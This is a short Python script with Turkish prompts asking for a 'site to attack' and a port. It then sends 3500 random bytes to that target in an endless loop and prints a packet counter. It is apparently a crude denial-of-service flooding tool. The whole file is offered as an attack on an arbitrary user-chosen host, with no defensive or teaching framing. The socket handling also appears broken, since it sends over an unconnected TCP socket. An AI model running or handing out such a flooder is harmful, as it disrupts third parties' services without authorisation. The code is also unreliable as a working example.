import socket
import random
import os 


os.system("clear")

hedef = str(input("saldırılacak site:"))
hedefp = int(input("saldırılıcak port numarası:"))


bytes = random._urandom(3500)

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

sayac = 0

while (True):
	sock.sendto(bytes,(hedef,hedefp))
	sayac = sayac+1
	print(sayac)
